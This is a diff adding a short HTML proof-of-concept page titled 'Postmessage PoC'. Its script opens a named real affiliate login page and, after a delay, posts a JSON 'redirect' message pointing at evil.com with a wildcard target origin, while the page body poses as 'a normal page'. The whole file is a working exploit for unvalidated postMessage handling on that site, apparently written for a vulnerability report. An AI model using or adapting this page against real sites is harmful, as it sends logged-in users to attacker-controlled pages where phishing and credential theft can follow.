@@ -1,0 +1,24 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Postmessage PoC</title>
+    <script>
+      let win = window.open("https://affiliates.fanduel.com/login.asp");
+      let msg =
+        '{\n    "action": "redirect",\n"redirectUrl":"https://evil.com#"}';
+      msg = JSON.parse(msg);
+      setTimeout(function () {
+        win.postMessage(msg, "*");
+      }, 7000);
+
+      //
+
+      
+    </script>
+  </head>
+  <body>
+    <h1>Welcome this is a normal page !</h1>
+  </body>
+</html>
